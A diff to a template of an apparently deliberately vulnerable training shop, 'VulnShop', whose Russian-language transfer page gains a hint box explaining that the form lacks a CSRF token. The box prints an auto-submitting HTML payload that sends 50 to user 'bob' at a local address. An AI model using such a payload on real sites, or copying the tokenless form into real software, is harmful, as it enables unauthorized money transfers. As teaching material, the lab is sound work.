@@ -1,9 +1,18 @@
 {% extends "base.html" %}
 {% block title %}Перевод — VulnShop{% endblock %}
 {% block content %}
-<section class="form-page">
+<section class="form-page form-page-wide">
   <h1>Перевод средств</h1>
-  <p class="hint">CSRF: форма без токена — можно подделать запрос с другого сайта</p>
+  <div class="hint-box">
+    <p class="hint-box-title">CSRF</p>
+    <p>Форма без CSRF-токена. Пока жертва залогинена, вредоносная страница может отправить перевод на bob:</p>
+    <pre class="payload">&lt;form action="http://127.0.0.1:5000/transfer" method="POST"&gt;
+  &lt;input name="to_user" value="bob"&gt;
+  &lt;input name="amount" value="50"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>
+    <p><a href="{{ url_for('hints') }}#csrf">Подробнее →</a></p>
+  </div>
   {% if message %}
   <p class="ok">{{ message }}</p>
   {% endif %}
